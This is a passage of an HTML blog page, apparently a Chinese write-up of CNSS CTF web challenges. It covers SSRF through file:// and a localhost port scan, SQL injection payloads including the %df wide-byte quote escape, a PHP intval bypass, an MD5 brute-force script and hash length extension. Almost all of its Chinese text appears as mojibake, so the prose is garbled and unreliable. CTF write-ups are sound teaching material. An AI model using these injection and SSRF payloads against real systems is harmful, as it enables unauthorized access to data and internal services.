/><p>ä¹Ÿå°±æ˜¯ç±»ä¼¼äºä»£ç†çš„ä¸œè¥¿ï¼ŒåŸæ¥æŠŠä»£ç†æœåŠ¡å™¨ä½œä¸ºä»£ç†è®¿é—®å¤–ç½‘ï¼Œç°åœ¨åˆ©ç”¨ssrfè®¿é—®ä»£ç†æœåŠ¡å™¨å†…ç½‘ip</p><h4 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h4><p>file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ +ç»å¯¹è·¯å¾„</p><p>http:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€</p><p>ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLs</p><p>php:&#x2F;&#x2F; â€” è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ(I&#x2F;O streams)</p><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â /?url=127.0.0.1:xxx Â  Â  Â  //xxxè¿›è¡Œbpçˆ†ç ´</span><br></pre></td></tr></table></figure><h4 id="è¿™ä¸ªé¢˜"><a href="#è¿™ä¸ªé¢˜" class="headerlink" title="è¿™ä¸ªé¢˜"></a>è¿™ä¸ªé¢˜</h4><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212020796.png"></p><p>é¦–å…ˆ0.0.0.0:5000å’Œ127.0.0.1:5000éƒ½èƒ½è®¿é—®åˆ°å½“å‰é¡µé¢</p><p>ä¹Ÿå°±æ˜¯å­˜åœ¨ssrfæ³¨å…¥ï¼Œè‡³äº5000ï¼Œæ˜¯flaskæ¡†æ¶é»˜è®¤5000ç«¯å£ã€‚</p><p>ç„¶åè¿›è¡Œfileåè®®æ‹¿æœ¬åœ°æ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212216521.png"></p><h3 id="pycdcï¼ˆreï¼‰"><a href="#pycdcï¼ˆreï¼‰" class="headerlink" title="pycdcï¼ˆreï¼‰"></a>pycdcï¼ˆreï¼‰</h3><p><strong>pyç¼–è¯‘ç”Ÿæˆï¼Œå¼€å‘å•†ä¸ºäº†ä¸æ³„éœ²æºç ï¼Œä¸ºäº†æé«˜åŠ è½½é€Ÿåº¦ã€‚</strong></p><p>pycæ˜¯ä¸€ç§<strong>äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œæ˜¯ç”±pyæ–‡ä»¶ç»è¿‡ç¼–è¯‘åï¼Œç”Ÿæˆçš„æ–‡ä»¶ï¼Œpyæ–‡ä»¶å˜æˆpycæ–‡ä»¶åï¼Œ<strong>åŠ è½½çš„é€Ÿåº¦æœ‰æ‰€æé«˜</strong>ï¼Œè€Œä¸”pycæ˜¯ä¸€ç§è·¨å¹³å°çš„å­—èŠ‚ç ï¼Œæ˜¯ç”±[Python]çš„è™šæ‹Ÿæœºæ¥æ‰§è¡Œçš„ï¼Œè¿™ä¸ªæ˜¯ç±»ä¼¼äº[Java]æˆ–è€….NETçš„è™šæ‹Ÿæœºçš„æ¦‚å¿µã€‚pycçš„å†…å®¹ï¼Œæ˜¯è·Ÿpythonçš„<strong>ç‰ˆæœ¬ç›¸å…³</strong>çš„ï¼Œä¸åŒç‰ˆæœ¬ç¼–è¯‘åçš„pycæ–‡ä»¶æ˜¯ä¸åŒçš„ï¼Œ2.5ç¼–è¯‘çš„pycæ–‡ä»¶ï¼Œ2.4ç‰ˆæœ¬çš„pythonæ˜¯æ— æ³•æ‰§è¡Œçš„ã€‚</p><p>å¯ä»¥åç¼–è¯‘ï¼špycdcã€‚</p><h3 id="cython"><a href="#cython" class="headerlink" title="cython"></a>cython</h3><p><strong>ç”¨pythonè¯­æ³•å†™cæ‹“å±•ï¼Œå¯ä»¥ç›´æ¥è¢«pythonè°ƒç”¨ï¼ˆimportï¼‰</strong>ï¼Œ<strong>ä½†æ˜¯è¦æ³¨æ„ç‰ˆæœ¬å·</strong></p><p>Cythonæ˜¯ä¸€ä¸ª<strong>ç¼–ç¨‹è¯­è¨€</strong>ï¼Œå®ƒé€šè¿‡<strong>ç±»ä¼¼Pythonçš„è¯­æ³•æ¥ç¼–å†™Cæ‰©å±•å¹¶å¯ä»¥è¢«Pythonè°ƒç”¨</strong>.æ—¢å…·å¤‡äº†Pythonå¿«é€Ÿå¼€å‘çš„ç‰¹ç‚¹ï¼Œåˆå¯ä»¥è®©ä»£ç è¿è¡Œèµ·æ¥åƒCä¸€æ ·å¿«ï¼ŒåŒæ—¶è¿˜å¯ä»¥æ–¹ä¾¿åœ°è°ƒç”¨C libraryã€‚</p><h3 id="flaskæ¡†æ¶"><a href="#flaskæ¡†æ¶" class="headerlink" title="flaskæ¡†æ¶"></a>flaskæ¡†æ¶</h3><p>Pythonçš„å¸¸ç”¨<strong>æ¡†æ¶</strong>ï¼Œï¼Œè½»é‡çº§ï¼Œä¸¤ä¸ªä¸»è¦æ ¸å¿ƒåº”ç”¨æ˜¯Werkzeugå’Œæ¨¡æ¿å¼•æ“Jinja.</p><p>ï¼ˆddï¼‰</p><h2 id="Mid-CNSS-Database"><a href="#Mid-CNSS-Database" class="headerlink" title="[Mid] CNSS Database"></a>[Mid] CNSS Database</h2><p>â€œä¸ä¼šç”¨äº† <strong>Prepared Statement</strong> ä½ è¿˜èƒ½æ³¨å…¥æˆ‘å§â€</p><h4 id="Prepared-Statement"><a href="#Prepared-Statement" class="headerlink" title="Prepared Statement"></a>Prepared Statement</h4><h5 id="é¢„ç¼–è¯‘è¯­å¥"><a href="#é¢„ç¼–è¯‘è¯­å¥" class="headerlink" title="é¢„ç¼–è¯‘è¯­å¥"></a>é¢„ç¼–è¯‘è¯­å¥</h5><p>é€šå¸¸æˆ‘ä»¬çš„ä¸€æ¡sqlåœ¨dbæ¥æ”¶åˆ°æœ€ç»ˆæ‰§è¡Œå®Œæ¯•è¿”å›å¯ä»¥åˆ†ä¸ºä¸‹é¢ä¸‰ä¸ªè¿‡ç¨‹ï¼š</p><ol><li>è¯æ³•å’Œè¯­ä¹‰è§£æ</li><li>ä¼˜åŒ–sqlè¯­å¥ï¼Œåˆ¶å®šæ‰§è¡Œè®¡åˆ’</li><li>æ‰§è¡Œå¹¶è¿”å›ç»“æœ</li></ol><p>è¿™æ˜¯æ™®é€šè¯­å¥ç§°ä½œ<strong>Immediate Statements</strong>ï¼Œå°±æ˜¯æ²¡æœ‰ç»è¿‡é¢„ç¼–è¯‘ï¼Œç›´æ¥å°†è¯­å¥è¿‡æ»¤ä¼˜åŒ–åä¼ ç»™æ•°æ®åº“ï¼Œå°±æœ‰å¯èƒ½è®©æ•°æ®è¢«å½“æˆsqlè¯­å¥ä»£ç æ‰§è¡Œï¼ˆä¹Ÿå°±æ˜¯æ•°æ®å˜æˆäº†ä»£ç ï¼‰ï¼Ÿ</p><p>ä½†æ˜¯å¾ˆå¤šæƒ…å†µï¼Œæˆ‘ä»¬çš„ä¸€æ¡sqlè¯­å¥å¯èƒ½ä¼šåå¤æ‰§è¡Œï¼Œæˆ–è€…æ¯æ¬¡æ‰§è¡Œçš„æ—¶å€™åªæœ‰ä¸ªåˆ«çš„å€¼ä¸åŒï¼ˆæ¯”å¦‚queryçš„whereå­å¥å€¼ä¸åŒï¼Œupdateçš„setå­å¥å€¼ä¸åŒ,insertçš„valueså€¼ä¸åŒï¼‰ã€‚ å¦‚æœæ¯æ¬¡éƒ½éœ€è¦ç»è¿‡ä¸Šé¢çš„è¯æ³•è¯­ä¹‰è§£æã€è¯­å¥ä¼˜åŒ–ã€åˆ¶å®šæ‰§è¡Œè®¡åˆ’ç­‰ï¼Œåˆ™æ•ˆç‡å°±æ˜æ˜¾ä¸è¡Œäº†ã€‚</p><p>æ‰€è°“é¢„ç¼–è¯‘è¯­å¥å°±æ˜¯å°†è¿™ç±»è¯­å¥ä¸­çš„å€¼ç”¨å ä½ç¬¦æ›¿ä»£ï¼Œå¯ä»¥è§†ä¸ºå°†sqlè¯­å¥<strong>æ¨¡æ¿åŒ–æˆ–è€…è¯´å‚æ•°åŒ–</strong>ï¼Œä¸€èˆ¬ç§°è¿™ç±»è¯­å¥å«<strong>Prepared Statements</strong>æˆ–è€…<strong>Parameterized Statements</strong> é¢„ç¼–è¯‘è¯­å¥çš„ä¼˜åŠ¿åœ¨äºå½’çº³ä¸ºï¼šä¸€æ¬¡ç¼–è¯‘ã€å¤šæ¬¡è¿è¡Œï¼Œçœå»äº†è§£æä¼˜åŒ–ç­‰è¿‡ç¨‹ï¼›é¢„ç¼–è¯‘æ˜¯ç”¨æ¥æå‡SQLè¯­å¥çš„å“åº”é€Ÿåº¦çš„ï¼Œå°†ä¸€æ®µSQLè¯­å¥å®šåˆ¶æˆæ¨¡æ¿ï¼ŒæŠŠçµæ´»çš„å‚æ•°ä½œä¸º[å ä½ç¬¦]è®©æˆ‘ä»¬ä¼ é€’è¿›å»ï¼Œè¾¾åˆ°å¤šæ¬¡æ‰§è¡Œç›¸åŒçš„SQLè¯­å¥å¿…é¡»è¦é‡å¤æ ¡éªŒã€è§£æç­‰æ“ä½œï¼›</p><p><strong>æ­¤å¤–é¢„ç¼–è¯‘è¯­å¥èƒ½é˜²æ­¢sqlæ³¨å…¥ã€‚</strong>ä¸ºä»€ä¹ˆï¼Ÿ</p><p>è¿›è¡Œé¢„ç¼–è¯‘ä¹‹åï¼Œ[sqlè¯­å¥]å·²ç»è¢«æ•°æ®åº“<strong>åˆ†æï¼Œç¼–è¯‘å’Œä¼˜åŒ–</strong>äº†ï¼Œå¹¶ä¸”å…è®¸æ•°æ®åº“ä»¥å‚æ•°åŒ–çš„å½¢å¼è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥å³ä½¿æœ‰æ•æ„Ÿå­—ç¬¦æ•°æ®åº“<strong>ä¹Ÿä¼šå½“åšå±æ€§å€¼</strong>æ¥å¤„ç†è€Œä¸æ˜¯sqlæŒ‡ä»¤äº†</p><p>è¾“å…¥çš„æ•°æ®è¢«æ”¾è¿›å ä½ç¬¦é‡Œé¢ï¼Œæ•´ä¸ªsqlè¯­å¥ç»“æ„ä¸ä¼šæ”¹å˜ï¼Œä¹Ÿå°±ä¸å­˜åœ¨é—­åˆçš„è¯´æ³•ï¼Œç›¸å½“äºè¾“å…¥çš„ä¸œè¥¿åªèƒ½ä½œä¸ºå±æ€§å€¼ï¼ˆæ•°æ®ï¼‰æ‰§è¡Œï¼Œè€Œä¸èƒ½å˜æˆä»£ç è¯­å¥</p><h5 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h5><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¾“å‡ºçš„SQLæ–‡æ˜¯<strong>æŠŠæ•´ä¸ªå‚æ•°ç”¨å¼•å·åŒ…èµ·æ¥</strong>ï¼Œå¹¶æŠŠ<strong>å‚æ•°ä¸­çš„å¼•å·ä½œä¸ºè½¬ä¹‰å­—ç¬¦</strong>ï¼Œä»è€Œé¿å…äº†å‚æ•°ä¹Ÿä½œä¸ºæ¡ä»¶çš„ä¸€éƒ¨åˆ†</p><p>ç»•è¿‡éœ€è¦ä¸¤ç‚¹ï¼Œé˜²æ­¢å¼•å·è¢«è½¬ä¹‰ï¼Œç„¶åé—­åˆè¯­å¥ é˜²æ­¢è½¬ä¹‰&#x3D;ã€‹å®½å­—èŠ‚æ³¨å…¥</p><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><p>å…ˆæ€»ç»“sqlæ³¨å…¥æ€»å…±æœ‰å“ªäº›ç±»å‹ï¼š</p><p><strong>æ•°å­—å‹æ³¨å…¥ï¼š or 1&#x3D;1</strong> åœ¨è¾“å…¥æ•´å½¢å‚æ•°çš„åœ°æ–¹</p><p><strong>å­—ç¬¦å‹æ³¨å…¥ï¼š â€˜ or 1&#x3D;1#</strong> éœ€è¦é—­åˆå¼•å·</p><p>**æœç´¢å‹æ³¨å…¥ï¼š %xxx% or 1&#x3D;1 #%&amp;**amp;#x27; éœ€è¦é—­åˆ%</p><p><strong>XXå‹æ³¨å…¥ï¼š xxâ€™) or 1&#x3D;1#</strong> éœ€è¦é—­åˆå¥‡æ€ªçš„ä¸œè¥¿</p><p>æ–¹æ³•ï¼š</p><p><strong>è”åˆæŸ¥è¯¢ï¼ˆunionï¼‰æ³¨å…¥ã€å¸ƒå°”ç›²æ³¨(base on boolian)ã€æ—¶é—´ç›²æ³¨(base on time)ã€æŠ¥é”™ä¿¡æ¯æ³¨å…¥ã€å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ï¼Œåç§»æ³¨å…¥</strong></p><p><strong>å®½å­—èŠ‚æ³¨å…¥ï¼ˆâ›”å¿…é¡»æ˜¯GBK â›”åœ¨ â€˜ å‰åŠ  %df ç”¨äºç»•è¿‡ )</strong></p><p><strong>å…¶ä¸­ \ çš„URLç¼–ç æ˜¯ %5C ï¼Œå½“æˆ‘ä»¬åœ¨å•å¼•å·å‰é¢åŠ ä¸Š %df çš„æ—¶å€™ï¼Œæœ€ç»ˆå°±ä¼šå˜æˆ é‹â€™ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™ MYSQL ç”¨ GBK çš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º %df æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ é‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\â€™ &#x3D; %df%5c%27&#x3D;ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</strong></p><p>ä¹Ÿå°±æ˜¯æœ¬æ¥å•å¼•å·å‰é¢ä¼šæœ‰ä¸€ä¸ª&#x2F;æ¥è½¬ä¹‰ï¼Œä½†æ˜¯åˆ©ç”¨gbkä¸­æ”¯æŒå®½å­—èŠ‚ï¼Œå†åŠ ä¸€ä¸ªè®©&#x2F;å’Œ%dfå˜æˆå®½å­—èŠ‚ï¼Œç„¶åå¼•å·å°±é€ƒé€¸äº†</p><h4 id="pdoé¢„å¤„ç†"><a href="#pdoé¢„å¤„ç†" class="headerlink" title="pdoé¢„å¤„ç†"></a>pdoé¢„å¤„ç†</h4><p><strong>è€ŒPDOä½œä¸ºphpä¸­æœ€å…¸å‹çš„é¢„ç¼–è¯‘æŸ¥è¯¢æ–¹å¼</strong></p><p>è¿™ä¸ªå’Œé¢„ç¼–è¯‘å¾ˆåƒï¼Œå¦‚æœç†è§£ä¸åˆ°ä½ï¼Œåªæ˜¯ç®€å•ä½¿ç”¨PDOï¼Œå°±å’Œaddslashes()ä¸€æ ·åªæ˜¯å°†å¼•å·è½¬ä¹‰äº†ï¼Œ</p><p>å®é™…ä¸Šï¼Œåœ¨æ¨¡æ‹Ÿé¢„ç¼–è¯‘çš„æƒ…å†µä¸‹ï¼ŒPDOå¯¹äºSQLæ³¨å…¥çš„é˜²èŒƒï¼ˆPDO::queto()ï¼‰ï¼Œæ— éå°±æ˜¯å°†æ•°å­—å‹çš„æ³¨å…¥è½¬å˜ä¸ºå­—ç¬¦å‹çš„æ³¨å…¥ï¼Œåˆç”¨ç±»ä¼¼mysql_real_escape_string()çš„æ–¹æ³•å°†å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ç­‰å­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ã€‚</p><p>å°†ä¸€äº›å‚æ•°ä¿®æ”¹ä¹‹åï¼Œå°±ä¼šå‘ç°ä¸è®ºè¾“å…¥ä»€ä¹ˆéƒ½ä¼šè¢«å½“æˆæ•°æ®å¤„ç†ï¼ˆåå…­è¿›åˆ¶è½¬ç ï¼‰</p><p>æ­£å› ä¸ºä¸Šé¢è¿™å¥è¯ï¼Œ</p><p>Prepareè¯­å¥æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å®ƒå¯ä»¥å°†16è¿›åˆ¶ä¸²è½¬ä¸ºè¯­å¥å­—ç¬¦ä¸²å¹¶æ‰§è¡Œã€‚å¦‚æœæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå­˜åœ¨å †å æ³¨å…¥çš„åœºæ™¯ï¼Œä½†è¿‡æ»¤éå¸¸ä¸¥æ ¼ï¼Œä¾¿å¯ä»¥ä½¿ç”¨prepareè¯­å¥è¿›è¡Œç»•è¿‡ã€‚</p><h2 id="Mid-ezpad"><a href="#Mid-ezpad" class="headerlink" title="[Mid] ezpad"></a>[Mid] ezpad</h2><h3 id="è„šæœ¬çˆ†ç ´"><a href="#è„šæœ¬çˆ†ç ´" class="headerlink" title="è„šæœ¬çˆ†ç ´"></a>è„šæœ¬çˆ†ç ´</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Â if (preg_match(&#x27;/^2022(.*?)CNSS$/&#x27;, $cnss)) </span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â if (md5($cnss) === &#x27;a5e8a02c361fb593dae3f3ee3256de0f&#x27;) Â  &#123;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo md5($flag); &#125;</span><br></pre></td></tr></table></figure><p>cnssæ ¼å¼è¦æ±‚ä¸ºï¼š2022CNSSï¼Œåœ¨è¿™ç§åŸºç¡€ä¸‹ç ´è§£md5ï¼Œåªèƒ½è€ƒè™‘è„šæœ¬çˆ†ç ´</p><p>é™„ä¸ŠæŠ„çš„xlè„šæœ¬(å¤ä»¤è¥)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Â #!/usr/bin/env python</span><br><span class="line">Â # -*- coding:utf-8 -*-</span><br><span class="line">Â # auther:youzhi</span><br><span class="line">Â # time:2022/9/17</span><br><span class="line">Â import string</span><br><span class="line">Â import hashlib</span><br><span class="line">Â payload = string.ascii_letters +string.digits+&quot;_&quot;</span><br><span class="line">Â def calc_md5(s):</span><br><span class="line">Â     md5 = hashlib.md5(s.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">Â     if(md5 == &quot;8cd38fa45e987e3ed7d523bbd40ce74a&quot;):</span><br><span class="line">Â         print(s)</span><br><span class="line">Â def getstr(payload, s, slen):</span><br><span class="line">Â     if(len(s) == slen):</span><br><span class="line">Â         #print(&quot;cnss&#123;&quot; + s + &quot;&#125;&quot;) Â  Â  Â  Â  Â   ä¸€ä¸ªé€’å½’</span><br><span class="line">Â         calc_md5(&quot;cnss&#123;&quot; + s + &quot;&#125;&quot;) </span><br><span class="line">Â         return s</span><br><span class="line">Â     for i in payload:</span><br><span class="line">Â         sl = s + i</span><br><span class="line">Â         getstr(payload, sl, slen)</span><br><span class="line">Â for i in range(25, 26):</span><br><span class="line">Â     getstr(payload,&#x27;&#x27;, i)</span><br></pre></td></tr></table></figure><h3 id="intvalç»•è¿‡"><a href="#intvalç»•è¿‡" class="headerlink" title="intvalç»•è¿‡"></a>intvalç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â intval($cnss) === intval(strrev($cnss) Â  Â  Â //intval(2022***CNSS)===intval(CNSS***2022)</span><br></pre></td></tr></table></figure><p>intval()å‡½æ•°å°†å‚æ•°idè½¬æ¢ä¸ºæ•°å€¼å‹ strrevå°†å­—ç¬¦ä¸²å–å</p><p>å‰è€…è‡³å°‘2022å¾€åï¼Œåè€…ä¸ºé›¶ï¼Œç°åœ¨éœ€è¦è®©å‰è€…ä¸º0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â #intvalæœ‰ä¸€äº›æ¼æ´</span><br><span class="line">Â 64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚ </span><br><span class="line">Â #æœ‰äº›æ—¶å€™è¿”å›æœ€å¤§å€¼ï¼Œæœ‰äº›æ—¶å€™è¿”å›0ï¼ˆå–å†³äºå­—ç¬¦ä¸²æœ€å·¦ä¾§çš„å­—ç¬¦ï¼‰</span><br><span class="line">Â ç©ºæ•°ç»„ä¹Ÿä¼šè¿”å›0ï¼Œéç©ºæ•°ç»„è¿”å›1ï¼Œæ­¤å¤„ä¸èƒ½æ˜¯ç©ºæ•°ç»„ï¼Œå› æ­¤ä¸èƒ½åˆ©ç”¨è¿™ä¸ªç»•è¿‡</span><br><span class="line">Â 2022e***(æ•°å­—)</span><br><span class="line">Â å˜æˆæŒ‡æ•°å½¢å¼ Â æ˜¯æŒ‡ä»¥10ä¸ºåº•çš„æŒ‡æ•°ã€‚ä»£è¡¨çš„å°±æ˜¯ç§‘å­¦è®°æ•°æ³•ï¼Œe5å°±ä»£è¡¨10^5</span><br></pre></td></tr></table></figure><h3 id="hashé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#hashé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="hashé•¿åº¦æ‰©å±•æ”»å‡»"></a>hashé•¿åº¦æ‰©å±•æ”»å‡»</h3><p>ï¼ˆhash length extensionï¼‰</p><p><strong>æŒ‡é’ˆå¯¹æŸäº›å…è®¸åŒ…å«é¢å¤–ä¿¡æ¯çš„<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">åŠ å¯†</a>æ•£åˆ—å‡½æ•°çš„æ”»å‡»æ‰‹æ®µã€‚æ¬¡æ”»å‡»é€‚ç”¨äºMD5å’ŒSHA-1ç­‰åŸºäºMerkleâ€“DamgÃ¥rdæ„é€ çš„ç®—æ³•</strong></p><p>å“ˆå¸Œæ‘˜è¦ç®—æ³•ï¼Œå¦‚MD5,SHA1, SHA2ç­‰ï¼Œéƒ½æ˜¯åŸºäºMerkleâ€“DamgÃ¥rdç»“æ„ã€‚è¿™ç±»ç®—æ³•æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼šå¦‚æœä½ çŸ¥é“messageå’ŒMACï¼Œåªéœ€å†çŸ¥é“keyçš„é•¿åº¦ï¼Œå°½ç®¡ä¸çŸ¥é“keyçš„å€¼ï¼Œä¹Ÿèƒ½åœ¨messageåé¢æ·»åŠ ä¿¡æ¯å¹¶è®¡ç®—å‡ºç›¸åº”MACã€‚</p><p>Example: message + padding +extension</p><h4 id="hashåŠ å¯†åŸç†"><a href="#hashåŠ å¯†åŸç†" class="headerlink" title="hashåŠ å¯†åŸç†"></a>hashåŠ å¯†åŸç†</h4><p>æˆ‘ä»¬éœ€è¦äº†è§£ä»¥ä¸‹å‡ ç‚¹md5åŠ å¯†è¿‡ç¨‹ï¼š</p><blockquote><p>MD5åŠ å¯†è¿‡ç¨‹ä¸­512æ¯”ç‰¹ï¼ˆ64å­—èŠ‚ï¼‰ä¸ºä¸€ç»„ï¼Œå±äºåˆ†ç»„åŠ å¯†ï¼Œè€Œä¸”åœ¨è¿ç®—çš„è¿‡ç¨‹ä¸­ï¼Œå°†512æ¯”ç‰¹åˆ†ä¸º32bit*16å—ï¼Œåˆ†å—è¿ç®—</p><p>å…³é”®åˆ©ç”¨çš„æ˜¯MD5çš„å¡«å……ï¼Œå¯¹åŠ å¯†çš„å­—ç¬¦ä¸²è¿›è¡Œå¡«å……(æ¯”ç‰¹ç¬¬ä¸€ä½ä¸º1å…¶ä½™æ¯”ç‰¹ä¸º0)ï¼Œä½¿ä¹‹(äºŒè¿›åˆ¶)è¡¥åˆ°448æ¨¡512åŒä½™ï¼Œå³é•¿åº¦ä¸º512çš„å€æ•°å‡64ï¼Œæœ€åçš„64ä½åœ¨è¡¥å……ä¸ºåŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™æ ·åˆšå¥½è¡¥æ»¡512ä½çš„å€æ•°ï¼Œå¦‚æœå½“å‰æ˜æ–‡æ­£å¥½æ˜¯512bitå€æ•°åˆ™å†åŠ ä¸Šä¸€ä¸ª512bitçš„ä¸€ç»„ã€‚</p><p>MD5ä¸ç®¡æ€ä¹ˆåŠ å¯†ï¼Œæ¯ä¸€å—åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ä½œä¸ºä¸‹ä¸€æ¬¡åŠ å¯†çš„åˆå§‹å‘é‡ã€‚</p></blockquote><p>ä¸¾ä¸€ä¸ªä¾‹å­è®²ä¸€ä¸‹å¦‚ä½•å¡«å……ï¼šæ¯”å¦‚å­—ç¬¦ä¸²â€œAckerâ€ åå…­è¿›åˆ¶0x41636b6572è¿™é‡Œä¸448æ¨¡512ä¸åŒä½™ï¼Œéœ€è¡¥ä½æ»¡è¶³äºŒè¿›åˆ¶é•¿åº¦ä½512çš„å€æ•°ï¼Œè¡¥ä½åçš„æ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â 0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è¡¥å……ï¼šä»¥åå…­è¿›åˆ¶è¡¨ç¤ºä¸€å…±æ˜¯128ä¸ªå­—ç¬¦ï¼Œåå…­è¿›åˆ¶æ¯ä¸ªå­—ç¬¦èƒ½å¤Ÿè½¬æ¢æˆ4ä½äºŒè¿›åˆ¶ï¼Œ128*4&#x3D;512è¿™å°±æ˜¯ä¸€ç»„ï¼Œæ­£å¥½æ˜¯512bitã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320532282.jpg"></p><p>ä¸Šå›¾ä¸­çš„8æ˜¯å› ä¸ºè¡¥ä½æ—¶äºŒè¿›åˆ¶ç¬¬ä¸€ä½è¦è¡¥1ï¼Œé‚£ä¹ˆ1000è½¬æ¢æˆ16è¿›åˆ¶å°±æ˜¯8.åé¢éƒ½è¡¥ä¸Š0.</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320602395.jpg"></p><p>å¡«å……æ•°æ®æœ€å8å­—èŠ‚é•¿åº¦ï¼ŒAckeré•¿åº¦ä¸º5*8&#x3D;40bitï¼Œåˆå› ä¸º0x28&#x3D;40æ‰€ä»¥16è¿›åˆ¶æ˜¾ç¤ºä¸º28.</p><p>ä¸ºä»€ä¹ˆæ•°æ®ä¼šåœ¨å·¦ç«¯ï¼šMD5ä¸­å‚¨å­˜çš„éƒ½æ˜¯å°ç«¯æ–¹å¼ï¼Œæ¯”å¦‚0x12345678ï¼Œé‚£ä¹ˆmd5å­˜å‚¨é¡ºåºå°±æ˜¯0x78563412</p><h4 id="MD5æ‹“å±•æ”»å‡»æ¼”ç¤º"><a href="#MD5æ‹“å±•æ”»å‡»æ¼”ç¤º" class="headerlink" title="MD5æ‹“å±•æ”»å‡»æ¼”ç¤º"></a><strong>MD5æ‹“å±•æ”»å‡»æ¼”ç¤º</strong></h4><p>ä¸‹å›¾ä¸ºåŠ å¯†æµç¨‹å›¾ï¼Œå¯ä»¥æ›´ç›´è§‚çœ‹æ¸…æ¥šæ•´ä¸ªæµç¨‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320694308.jpg"></p><p>é€‰ä¸€ä¸ªå­—ç¬¦ä¸²ä¾‹å¦‚â€œAckerâ€MD5ï¼ˆâ€œAckerâ€ï¼‰&#x3D; dee2fb2df156f4040f893d8a10ac1034</p><p>ç°åœ¨æˆ‘ä»¬ä¸éœ€è¦çŸ¥é“å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆã€‚åªéœ€è¦çŸ¥é“å…¶é•¿åº¦ï¼Œå¹¶å°†å­—ç¬¦ä¸²å¡«å……å®Œï¼Œæ–°åŠ ä¸€ä¸ªå­—ç¬¦ä¸²å¦‚ï¼šadditionï¼Œä¹‹å‰å¾—åˆ°çš„â€œAckerâ€MD5å€¼ä½œä¸ºæœ€åä¸€å—åŠ å¯†çš„åˆå§‹å‘é‡ï¼Œæœ€åå¾—åˆ°çš„ç»“æœå’ŒMD5ï¼ˆâ€œAcker+additionâ€ï¼‰æ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="Mid-Pesudo2"><a href="#Mid-Pesudo2" class="headerlink" title="[Mid] Pesudo2"></a>[Mid] Pesudo2</h2><h4 